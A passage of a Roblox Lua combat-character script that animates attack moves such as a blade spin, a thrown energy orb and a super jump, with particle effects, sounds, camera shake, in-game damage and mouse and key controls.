cam.CFrame = lerp(cam.CFrame, root.CFrame * cf(1, 1.5, -6) * ceuler(math.rad(10), math.rad(170), math.rad(-20)), 0.1)
else
break
end
end
end))
for i = 0, 10, 0.1 do
swait()
slash(math.random(50,100)/10,5,true,"Round","Add","Out",root.CFrame*CFrame.new(0,-3,0)*CFrame.Angles(math.rad(math.random(-5,5)),math.rad(math.random(-360,360)),math.rad(math.random(-5,5))),vt(0.05,0.01,0.05),math.random(25,50)/250,BrickColor.new("White"))
sphere2(5,"Add",larm.CFrame*CFrame.new(0,-1.5,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),vt(1,1,1),-0.01,0.1,-0.01,BrickColor.new("Cyan"),BrickColor.new("Cyan").Color)
slash(math.random(20,40)/10,5,true,"Round","Add","Out",larm.CFrame*CFrame.new(0,-1.5,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),vt(0.025,0.001,0.025),-0.025,BrickColor.new("White"))
RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-6),math.rad(0),math.rad(-6)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(30),math.rad(3)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(-50)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-15),math.rad(5),math.rad(50)),.3)
RW.C0=clerp(RW.C0,cf(1.45,0.5,0.1)*angles(math.rad(-13),math.rad(-40),math.rad(20)),.3)
LW.C0=clerp(LW.C0,cf(-1.45,0.5,0.1)*angles(math.rad(170),math.rad(10),math.rad(0)),.3)
weaponweld.C1=clerp(weaponweld.C1,cf(0,1,0)*angles(math.rad(0),math.rad(130),math.rad(0)),.3)
end
OverCut = true
local orb = Instance.new("Part", char)
orb.Anchored = true
orb.BrickColor = BrickColor.new("Toothpaste")
orb.CanCollide = false
orb.FormFactor = 3
orb.Name = "Ring"
orb.Material = "Neon"
orb.Size = Vector3.new(1, 1, 1)
orb.Transparency = 0.5
orb.TopSurface = 0
orb.BottomSurface = 0
local orbm = Instance.new("SpecialMesh", orb)
orbm.MeshType = "FileMesh"
orbm.MeshId = "rbxassetid://361629844"
orbm.Scale = vt(30,60,60)
orb.CFrame = root.CFrame*CFrame.new(0,50,0)
for i = 0, 24 do
slash(math.random(10,30)/10,5,true,"Round","Add","Out",orb.CFrame*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),vt(0.1,0.001,0.1),math.random(50,400)/420,BrickColor.new("White"))
end
sphere2(2,"Add",orb.CFrame,vt(10,10,10),0.5,0.5,0.5,BrickColor.new("Cyan"),BrickColor.new("Cyan").Color)
sphere2(3,"Add",orb.CFrame,vt(10,10,10),0.75,0.75,0.75,BrickColor.new("Cyan"),BrickColor.new("Cyan").Color)
sphere2(4,"Add",orb.CFrame,vt(10,10,10),1,1,1,BrickColor.new("Cyan"),BrickColor.new("Cyan").Color)
CFuncs["Sound"].Create("rbxassetid://1368637781", orb, 7.5, 1)
local a = Instance.new("Part",workspace)
a.Name = "Direction"	
a.Anchored = true
a.Transparency = 1
a.CanCollide = false
local ray = Ray.new(
orb.CFrame.p,                           -- origin
(mouse.Hit.p - orb.CFrame.p).unit * 500 -- direction
) 
local ignore = orb
local hit, position, normal = workspace:FindPartOnRay(ray, ignore)
a.BottomSurface = 10
a.TopSurface = 10
local distance = (orb.CFrame.p - position).magnitude
a.Size = Vector3.new(0.1, 0.1, 0.1)
a.CFrame = CFrame.new(orb.CFrame.p, position) * CFrame.new(0, 0, 0)
orb.CFrame = a.CFrame
for i = 0, 8, 0.1 do
swait()
sphere2(5,"Add",orb.CFrame*CFrame.new(math.random(-20,20),math.random(-20,20),math.random(-20,20)),vt(1,1,1),0.01,0.01,0.01,BrickColor.new("Royal purple"),BrickColor.new("Royal purple").Color)
ray = Ray.new(
orb.CFrame.p,                           -- origin
(mouse.Hit.p - orb.CFrame.p).unit * 500 -- direction
) 
hit, position, normal = workspace:FindPartOnRay(ray, ignore)
distance = (orb.CFrame.p - position).magnitude
a.CFrame = CFrame.new(orb.CFrame.p, position) * CFrame.new(0, 0, 0)
orb.CFrame = a.CFrame
slash(math.random(50,100)/10,5,true,"Round","Add","Out",root.CFrame*CFrame.new(0,-3,0)*CFrame.Angles(math.rad(math.random(-5,5)),math.rad(math.random(-360,360)),math.rad(math.random(-5,5))),vt(0.05,0.01,0.05),math.random(25,50)/250,BrickColor.new("White"))
cam.CFrame = lerp(cam.CFrame, root.CFrame * cf(20, 65, 55) * ceuler(math.rad(-20), math.rad(0), math.rad(10)), 0.2)
RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-6),math.rad(0),math.rad(-6)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(40),math.rad(3)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(-90)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(5),math.rad(0),math.rad(90)),.3)
RW.C0=clerp(RW.C0,cf(1.45,0.5,0.1)*angles(math.rad(-13),math.rad(-20),math.rad(20)),.3)
LW.C0=clerp(LW.C0,cf(-1.25,0.5,-0.5)*angles(math.rad(100),math.rad(0),math.rad(60)),.3)
weaponweld.C1=clerp(weaponweld.C1,cf(0,1,0)*angles(math.rad(0),math.rad(130),math.rad(0)),.3)
end
cam.CameraType = "Custom"
orb.Anchored = false
a:Destroy()
local bv = Instance.new("BodyVelocity")
bv.maxForce = Vector3.new(1e9, 1e9, 1e9)
bv.velocity = orb.CFrame.lookVector*250
bv.Parent = orb
local hitted = false
CFuncs["Sound"].Create("rbxassetid://466493476", orb, 7.5, 0.7)
waveEff(2,"Add","Out",orb.CFrame*CFrame.Angles(math.rad(90),math.rad(math.random(-360,360)),0),vt(5,1,5),0.5,0.1,BrickColor.new("Cyan"))
waveEff(4,"Add","Out",orb.CFrame*CFrame.Angles(math.rad(90),math.rad(math.random(-360,360)),0),vt(5,1,5),0.5,0.05,BrickColor.new("Royal purple"))
coroutine.resume(coroutine.create(function()
while true do
swait(2)
if hitted == false and orb.Parent ~= nil then
slash(3,5,true,"Round","Add","Out",orb.CFrame*CFrame.Angles(math.rad(90),math.rad(math.random(-360,360)),0),vt(0.075,0.005,0.075),-0.05,BrickColor.new("White"))
elseif hitted == true and orb.Parent == nil then
break
end
end
end))
orb.Touched:scconnect(function(hit) 
if hitted == false and hit.Parent ~= char then
hitted = true
MagniDamage(orb, 30, 72,95, 0, "Normal",153092213)
CFuncs["Sound"].Create("rbxassetid://763717897", orb, 10, 1)
CFuncs["Sound"].Create("rbxassetid://1295446488", orb, 9, 0.75)
for i = 0, 24 do
slash(math.random(15,30)/10,5,true,"Round","Add","Out",orb.CFrame*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),vt(0.01,0.001,0.01),math.random(125,250)/400,BrickColor.new("White"))
end
slash(1,5,true,"Round","Add","Out",orb.CFrame*CFrame.Angles(math.rad(90),math.rad(math.random(-360,360)),0),vt(0.01,0.015,0.01),1.5,BrickColor.new("White"))
slash(1,5,true,"Round","Add","Out",orb.CFrame*CFrame.Angles(math.rad(90),math.rad(math.random(-360,360)),0),vt(0.01,0.01,0.01),2,BrickColor.new("White"))
sphere2(1,"Add",orb.CFrame,vt(10,10,10),1,1,1,BrickColor.new("Cyan"),BrickColor.new("Cyan").Color)
sphere2(1.5,"Add",orb.CFrame,vt(10,10,10),1.1,1.1,1.1,BrickColor.new("Royal purple"),BrickColor.new("Royal purple").Color)
sphere2(2,"Add",orb.CFrame,vt(10,10,10),1.2,1.2,1.2,BrickColor.new("Royal purple"),BrickColor.new("Royal purple").Color)
orb.Anchored = true
orb.Transparency = 1
coroutine.resume(coroutine.create(function()
for i = 0, 4, 0.1 do
swait()
slash(math.random(10,50)/10,5,true,"Round","Add","Out",orb.CFrame*CFrame.Angles(math.rad(90 + math.random(-5,5)),math.rad(math.random(-360,360)),math.rad(math.random(-5,5))),vt(0.01,0.015,0.01),1.5,BrickColor.new("Royal purple"))
hum.CameraOffset = vt(math.random(-10,10)/25,math.random(-10,10)/25,math.random(-10,10)/25)
end
hum.CameraOffset = vt(0,0,0)
end))
wait(10)
orb:Destroy()
end
end)
game:GetService("Debris"):AddItem(orb, 10)
for i = 0, 2, 0.1 do
swait()
slash(math.random(50,100)/10,5,true,"Round","Add","Out",root.CFrame*CFrame.new(0,-3,0)*CFrame.Angles(math.rad(math.random(-5,5)),math.rad(math.random(-360,360)),math.rad(math.random(-5,5))),vt(0.05,0.01,0.05),math.random(25,50)/250,BrickColor.new("White"))
RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-6),math.rad(0),math.rad(-6)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(30),math.rad(3)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,-0.4,0)*angles(math.rad(0),math.rad(0),math.rad(-70)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(5),math.rad(0),math.rad(70)),.3)
RW.C0=clerp(RW.C0,cf(1.45,0.5,0.1)*angles(math.rad(-13),math.rad(-40),math.rad(20)),.3)
LW.C0=clerp(LW.C0,cf(-1.45,0.5,0.1)*angles(math.rad(90),math.rad(0),math.rad(-80)),.3)
weaponweld.C1=clerp(weaponweld.C1,cf(0,1,0)*angles(math.rad(0),math.rad(130),math.rad(0)),.3)
end
attack = false
hum.WalkSpeed = 24
hum.JumpPower = 50
end

function bladespinagain()
attack = true
hum.WalkSpeed = 4
hum.JumpPower = 0
CFuncs["Sound"].Create("rbxassetid://1368598393", rarmor, 2, 1)
CFuncs["Sound"].Create("rbxassetid://1368583274", rarmor, 2.5, 1)
for x = 0, 9 do
slash(5,5,true,"Round","Add","Out",rarmor.CFrame*CFrame.new(0,0,0)*CFrame.Angles(0,0,0),vt(0.05,0.01,0.05),0.05,BrickColor.new("White"))
CFuncs["Sound"].Create("rbxassetid://200633108", rarmor, 2, 1.05)
CFuncs["Sound"].Create("rbxassetid://234365573", rarmor, 2.5, 1.025)
for i = 0, 1, 0.6 do
		swait()
sphereMK(5,math.random(4,25)/45,"Add",root.CFrame*CFrame.new(math.random(-15,15),-20,math.random(-15,15))*CFrame.Angles(math.rad(90 + math.random(-10,10)),math.rad(math.random(-10,10)),math.rad(math.random(-10,10))),0.75,0.75,20,-0.0075,BrickColor.new("Royal purple"),BrickColor.new("Royal purple").Color,0)
sphereMK(5,math.random(1,15)/45,"Add",root.CFrame*CFrame.new(math.random(-15,15),-20,math.random(-15,15))*CFrame.Angles(math.rad(90 + math.random(-25,25)),math.rad(math.random(-25,25)),math.rad(math.random(-25,25))),0.75,0.75,20,-0.0075,BrickColor.new("Cyan"),BrickColor.new("Cyan").Color,0)
slash(math.random(50,100)/10,5,true,"Round","Add","Out",root.CFrame*CFrame.new(0,-3,0)*CFrame.Angles(math.rad(math.random(-5,5)),math.rad(math.random(-360,360)),math.rad(math.random(-5,5))),vt(0.05,0.01,0.05),math.random(25,50)/250,BrickColor.new("White"))
sphere2(5,"Add",rarmor.CFrame*CFrame.new(math.random(-8,-2),0,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),vt(0.1,0.1,0.1),0,0.1,0,BrickColor.new("Cyan"),BrickColor.new("Cyan").Color)
hum.CameraOffset = vt(math.random(-10,10)/100,math.random(-10,10)/100,math.random(-10,10)/100)
	RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(-10)),.2)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(30),math.rad(0)),.2)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0.25,0)*angles(math.rad(0),math.rad(0),math.rad(-60)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(4),math.rad(0),math.rad(60)),.3)
RW.C0=clerp(RW.C0,cf(1.45,0.5,0.1)*angles(math.rad(90),math.rad(0),math.rad(80)),.3)
LW.C0=clerp(LW.C0,cf(-1.45,0.5,0.1)*angles(math.rad(90),math.rad(0),math.rad(-60)),.3)
weaponweld.C1=clerp(weaponweld.C1,cf(0,1,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
end
slash(5,5,true,"Round","Add","Out",rarmor.CFrame*CFrame.new(0,0,0)*CFrame.Angles(0,0,0),vt(0.05,0.01,0.05),0.05,BrickColor.new("White"))
for i = 0, 1, 0.6 do
		swait()
sphereMK(5,math.random(4,25)/45,"Add",root.CFrame*CFrame.new(math.random(-15,15),-20,math.random(-15,15))*CFrame.Angles(math.rad(90 + math.random(-10,10)),math.rad(math.random(-10,10)),math.rad(math.random(-10,10))),0.75,0.75,20,-0.0075,BrickColor.new("Royal purple"),BrickColor.new("Royal purple").Color,0)
sphereMK(5,math.random(1,15)/45,"Add",root.CFrame*CFrame.new(math.random(-15,15),-20,math.random(-15,15))*CFrame.Angles(math.rad(90 + math.random(-25,25)),math.rad(math.random(-25,25)),math.rad(math.random(-25,25))),0.75,0.75,20,-0.0075,BrickColor.new("Cyan"),BrickColor.new("Cyan").Color,0)
slash(math.random(50,100)/10,5,true,"Round","Add","Out",root.CFrame*CFrame.new(0,-3,0)*CFrame.Angles(math.rad(math.random(-5,5)),math.rad(math.random(-360,360)),math.rad(math.random(-5,5))),vt(0.05,0.01,0.05),math.random(25,50)/250,BrickColor.new("White"))
sphere2(5,"Add",rarmor.CFrame*CFrame.new(math.random(-8,-2),0,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),vt(0.1,0.1,0.1),0,0.1,0,BrickColor.new("Cyan"),BrickColor.new("Cyan").Color)
hum.CameraOffset = vt(math.random(-10,10)/100,math.random(-10,10)/100,math.random(-10,10)/100)
	RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(-10)),.2)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(30),math.rad(0)),.2)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0.25,0)*angles(math.rad(0),math.rad(0),math.rad(-60)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(4),math.rad(0),math.rad(60)),.3)
RW.C0=clerp(RW.C0,cf(1.45,0.5,0.1)*angles(math.rad(90),math.rad(0),math.rad(80)),.3)
LW.C0=clerp(LW.C0,cf(-1.45,0.5,0.1)*angles(math.rad(90),math.rad(0),math.rad(-60)),.3)
weaponweld.C1=clerp(weaponweld.C1,cf(0,1,0)*angles(math.rad(0),math.rad(90),math.rad(0)),.3)
end
slash(5,5,true,"Round","Add","Out",rarmor.CFrame*CFrame.new(0,0,0)*CFrame.Angles(0,0,0),vt(0.05,0.01,0.05),0.05,BrickColor.new("White"))
for i = 0, 1, 0.6 do
		swait()
sphereMK(5,math.random(4,25)/45,"Add",root.CFrame*CFrame.new(math.random(-15,15),-20,math.random(-15,15))*CFrame.Angles(math.rad(90 + math.random(-10,10)),math.rad(math.random(-10,10)),math.rad(math.random(-10,10))),0.75,0.75,20,-0.0075,BrickColor.new("Royal purple"),BrickColor.new("Royal purple").Color,0)
sphereMK(5,math.random(1,15)/45,"Add",root.CFrame*CFrame.new(math.random(-15,15),-20,math.random(-15,15))*CFrame.Angles(math.rad(90 + math.random(-25,25)),math.rad(math.random(-25,25)),math.rad(math.random(-25,25))),0.75,0.75,20,-0.0075,BrickColor.new("Cyan"),BrickColor.new("Cyan").Color,0)
slash(math.random(50,100)/10,5,true,"Round","Add","Out",root.CFrame*CFrame.new(0,-3,0)*CFrame.Angles(math.rad(math.random(-5,5)),math.rad(math.random(-360,360)),math.rad(math.random(-5,5))),vt(0.05,0.01,0.05),math.random(25,50)/250,BrickColor.new("White"))
sphere2(5,"Add",rarmor.CFrame*CFrame.new(math.random(-8,-2),0,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),vt(0.1,0.1,0.1),0,0.1,0,BrickColor.new("Cyan"),BrickColor.new("Cyan").Color)
hum.CameraOffset = vt(math.random(-10,10)/100,math.random(-10,10)/100,math.random(-10,10)/100)
	RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(-10)),.2)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(30),math.rad(0)),.2)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0.25,0)*angles(math.rad(0),math.rad(0),math.rad(-60)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(4),math.rad(0),math.rad(60)),.3)
RW.C0=clerp(RW.C0,cf(1.45,0.5,0.1)*angles(math.rad(90),math.rad(0),math.rad(80)),.3)
LW.C0=clerp(LW.C0,cf(-1.45,0.5,0.1)*angles(math.rad(90),math.rad(0),math.rad(-60)),.3)
weaponweld.C1=clerp(weaponweld.C1,cf(0,1,0)*angles(math.rad(0),math.rad(180),math.rad(0)),.3)
end
slash(5,5,true,"Round","Add","Out",rarmor.CFrame*CFrame.new(0,0,0)*CFrame.Angles(0,0,0),vt(0.05,0.01,0.05),0.05,BrickColor.new("White"))
for i = 0, 1, 0.6 do
		swait()
sphereMK(5,math.random(4,25)/45,"Add",root.CFrame*CFrame.new(math.random(-15,15),-20,math.random(-15,15))*CFrame.Angles(math.rad(90 + math.random(-10,10)),math.rad(math.random(-10,10)),math.rad(math.random(-10,10))),0.75,0.75,20,-0.0075,BrickColor.new("Royal purple"),BrickColor.new("Royal purple").Color,0)
sphereMK(5,math.random(1,15)/45,"Add",root.CFrame*CFrame.new(math.random(-15,15),-20,math.random(-15,15))*CFrame.Angles(math.rad(90 + math.random(-25,25)),math.rad(math.random(-25,25)),math.rad(math.random(-25,25))),0.75,0.75,20,-0.0075,BrickColor.new("Cyan"),BrickColor.new("Cyan").Color,0)
slash(math.random(50,100)/10,5,true,"Round","Add","Out",root.CFrame*CFrame.new(0,-3,0)*CFrame.Angles(math.rad(math.random(-5,5)),math.rad(math.random(-360,360)),math.rad(math.random(-5,5))),vt(0.05,0.01,0.05),math.random(25,50)/250,BrickColor.new("White"))
sphere2(5,"Add",rarmor.CFrame*CFrame.new(math.random(-8,-2),0,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),vt(0.1,0.1,0.1),0,0.1,0,BrickColor.new("Cyan"),BrickColor.new("Cyan").Color)
hum.CameraOffset = vt(math.random(-10,10)/100,math.random(-10,10)/100,math.random(-10,10)/100)
	RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(-10)),.2)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(30),math.rad(0)),.2)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0.25,0)*angles(math.rad(0),math.rad(0),math.rad(-60)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(4),math.rad(0),math.rad(60)),.3)
RW.C0=clerp(RW.C0,cf(1.45,0.5,0.1)*angles(math.rad(90),math.rad(0),math.rad(80)),.3)
LW.C0=clerp(LW.C0,cf(-1.45,0.5,0.1)*angles(math.rad(90),math.rad(0),math.rad(-60)),.3)
weaponweld.C1=clerp(weaponweld.C1,cf(0,1,0)*angles(math.rad(0),math.rad(270),math.rad(0)),.3)
end
end
local hitb = CreateParta(m,1,1,"SmoothPlastic",BrickColor.Random())
hitb.Anchored = true
hitb.CFrame = root.CFrame + root.CFrame.lookVector*8
hitb.CFrame = hitb.CFrame*CFrame.new(0,1,0)
MagniDamage(hitb, 8, 92,158, 0, "Normal",153092213)
sphere2(5,"Add",hitb.CFrame,vt(2.1,2.1,2),-0.02,-0.02,5,BrickColor.new("Royal purple"),BrickColor.new("Royal purple").Color)
sphere2(5,"Add",hitb.CFrame,vt(2,2,2),-0.02,-0.02,4,BrickColor.new("Cyan"),BrickColor.new("Cyan").Color)
for i = 0, 24 do
slash(math.random(20,100)/10,5,true,"Round","Add","Out",hitb.CFrame*CFrame.new(0,0,math.random(-60,60))*CFrame.Angles(math.rad(90),0,0),vt(0.01,0.01,0.01),math.random(10,100)/1000,BrickColor.new("White"))
end
CFuncs["Sound"].Create("rbxassetid://313205954", root, 4,1)
CFuncs["Sound"].Create("rbxassetid://1368637781", rarmor, 4,1)
CFuncs["Sound"].Create("rbxassetid://763718160", rarmor, 5, 1.1)
CFuncs["Sound"].Create("rbxassetid://782353443", rarmor, 6, 1)
--CFuncs["Sound"].Create("rbxassetid://1548538202", rarmor, 4,1)
for i = 0, 2, 0.1 do
		swait()
MagniDamage(hitb, 8, 92,158, 0, "Normal",153092213)
hum.CameraOffset = vt(math.random(-10,10)/25,math.random(-10,10)/25,math.random(-10,10)/25)
	RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(-20),math.rad(-10)),.9)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(0)),.9)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,-0.5,0)*angles(math.rad(0),math.rad(0),math.rad(80)),.9)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(4),math.rad(0),math.rad(-80)),.9)
RW.C0=clerp(RW.C0,cf(1.45,0.5,0.1)*angles(math.rad(90),math.rad(0),math.rad(70)),.9)
LW.C0=clerp(LW.C0,cf(-1.45,0.5,0.1)*angles(math.rad(10),math.rad(0),math.rad(-60)),.9)
weaponweld.C1=clerp(weaponweld.C1,cf(2,0,0)*angles(math.rad(90),math.rad(0),math.rad(-90)),.9)
end
hum.CameraOffset = vt(0,0,0)
hitb:Destroy()
attack = false
hum.WalkSpeed = 24
hum.JumpPower = 50
end

function superjump()
attack = true
hum.WalkSpeed = 0
hum.JumpPower = 0
wng1a.Transparency = wng1a.Transparency - 1
wng1b.Transparency = wng1b.Transparency - 1
wng2a.Transparency = wng2a.Transparency - 1
wng2b.Transparency = wng2b.Transparency - 1
sphere2(5,"Add",root.CFrame,vt(1,1,1),1.5,1.5,1.5,BrickColor.new("Royal purple"),BrickColor.new("Royal purple").Color)
sphere2(5,"Add",root.CFrame,vt(1,1,1),1,1,1,BrickColor.new("Cyan"),BrickColor.new("Cyan").Color)
CFuncs["Sound"].Create("rbxassetid://1368637781", root, 7.5, 1)
for i = 0, 2, 0.1 do
		swait()
hum.CameraOffset = vt(math.random(-10,10)/100,math.random(-10,10)/100,math.random(-10,10)/100)
root.Velocity = vt(0,0,0)
slash(math.random(50,100)/10,5,true,"Round","Add","Out",root.CFrame*CFrame.new(0,-3,0)*CFrame.Angles(math.rad(math.random(-5,5)),math.rad(math.random(-360,360)),math.rad(math.random(-5,5))),vt(0.05,0.01,0.05),math.random(25,250)/250,BrickColor.new("White"))
	RH.C0=clerp(RH.C0,cf(1,-0.45,-0.45)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(20)),.4)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(40)),.4)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,-0.5,-1)*angles(math.rad(20),math.rad(0),math.rad(0)),.4)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(4),math.rad(0),math.rad(0)),.4)
RW.C0=clerp(RW.C0,cf(1.45,0.5,0.1)*angles(math.rad(10),math.rad(0),math.rad(40)),.4)
LW.C0=clerp(LW.C0,cf(-1.45,0.5,0.1)*angles(math.rad(10),math.rad(0),math.rad(-40)),.4)
end
CFuncs["Sound"].Create("rbxassetid://477843807", root, 7, 1.05)
local lat1 = Instance.new("Attachment",larm)
lat1.Position = Vector3.new(1,-1,0.5)
local lat2 = Instance.new("Attachment",larm)
lat2.Position = Vector3.new(-1,-1,-0.5)
local rat1 = Instance.new("Attachment",rarm)
rat1.Position = Vector3.new(1,-1,-0.5)
local rat2 = Instance.new("Attachment",rarm)
rat2.Position = Vector3.new(-1,-1,0.5)
local tl1 = Instance.new('Trail',larm)
tl1.Attachment0 = lat1
tl1.Attachment1 = lat2
tl1.Texture = "http://www.roblox.com/asset/?id=1049219073"
tl1.LightEmission = 1
tl1.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 1),NumberSequenceKeypoint.new(0.05, 0),NumberSequenceKeypoint.new(1, 1)})
tl1.Color = ColorSequence.new(BrickColor.new('Royal purple').Color,BrickColor.new('Cyan').Color)
tl1.Lifetime = 5
local tl2 = tl1:Clone()
tl2.Attachment0 = rat1
tl2.Attachment1 = rat2
tl2.Parent = rarm
hum.JumpPower = 50
hum.Jump = true
swait()
hum.JumpPower = 0
root.Velocity = vt(0,250,0) + root.CFrame.lookVector*250
sphere2(5,"Add",root.CFrame*CFrame.Angles(math.rad(-45),0,0),vt(25,1,25),0.3,5,0.3,BrickColor.new("Royal purple"),BrickColor.new("Royal purple").Color)
sphere2(5,"Add",root.CFrame*CFrame.Angles(math.rad(-45),0,0),vt(25,1,25),0.2,4,0.2,BrickColor.new("Cyan"),BrickColor.new("Cyan").Color)
for i = 0, 49 do
waveEff(math.random(10,100)/10,"Add","Out",root.CFrame*CFrame.new(0,-3,0)*CFrame.Angles(0,math.rad(math.random(-360,360)),0),vt(15,0.25,15),math.random(25,250)/250,0.25,BrickColor.new("White"))
slash(math.random(10,100)/10,3,true,"Round","Add","Out",root.CFrame*CFrame.new(0,-3,0)*CFrame.Angles(math.rad(math.random(-10,10)),math.rad(math.random(-360,360)),math.rad(math.random(-10,10))),vt(0.01,0.01,0.01),math.random(50,500)/250,BrickColor.new("White"))
end
coroutine.resume(coroutine.create(function()
for i = 0, 2, 0.1 do
swait()
hum.CameraOffset = vt(math.random(-10,10)/50,math.random(-10,10)/50,math.random(-10,10)/50)
end
hum.CameraOffset = vt(0,0,0)
wait(3)
tl1.Enabled = false
tl2.Enabled = false
game:GetService("Debris"):AddItem(tl1, 5)
game:GetService("Debris"):AddItem(tl2, 5)
game:GetService("Debris"):AddItem(rat1, 5)
game:GetService("Debris"):AddItem(rat2, 5)
game:GetService("Debris"):AddItem(lat1, 5)
game:GetService("Debris"):AddItem(lat2, 5)
end))
CFuncs["Sound"].Create("rbxassetid://1295446488", root, 10, 1)
for i = 0, 3, 0.1 do
		swait()
RH.C0=clerp(RH.C0,cf(1,-0.45,-0.45)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(-20)),.4)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(30)),.4)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,-0.75,0)*angles(math.rad(40),math.rad(0),math.rad(0)),.4)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-20),math.rad(0),math.rad(0)),.4)
RW.C0=clerp(RW.C0,cf(1.45,0.5,0.1)*angles(math.rad(-30),math.rad(0),math.rad(20)),.4)
LW.C0=clerp(LW.C0,cf(-1.45,0.5,0.1)*angles(math.rad(-30),math.rad(0),math.rad(-20)),.4)
end
coroutine.resume(coroutine.create(function()
for i = 0, 99 do
swait()
wng1a.Transparency = wng1a.Transparency + 0.01
wng1b.Transparency = wng1b.Transparency + 0.01
wng2a.Transparency = wng2a.Transparency + 0.01
wng2b.Transparency = wng2b.Transparency + 0.01
end
end))
attack = false
if equipped == false then
hum.WalkSpeed = 16
else
hum.WalkSpeed = 24
end
hum.JumpPower = 50
end
------------------


local attacktype = 1
mouse.Button1Down:connect(function()
if equipped == true then
  if attack == false and attacktype == 1 then
    attacktype = 2
    attackone()
  elseif attack == false and attacktype == 2 then
    attacktype = 3
    attacktwo()
  elseif attack == false and attacktype == 3 then
    attacktype = 1
    attackthree()
  --[[elseif attack == false and attacktype == 4 then
    attacktype = 1
    --attackfour()]]--
  end
end
end)
mouse.KeyDown:connect(function(k)
if k == "f" and attack == false and equipped == false then
	maybe:FindFirstChildOfClass("AlignOrientation").Attachment1 = rarmor.Attachment
    maybe:FindFirstChildOfClass("AlignPosition").Attachment1 = rarmor.Attachment2

    rarmor.Attachment2.Position = Vector3.new(-2.5, 0.2, -0)
    rarmor.Attachment.Rotation = Vector3.new(-0, -0, -50)
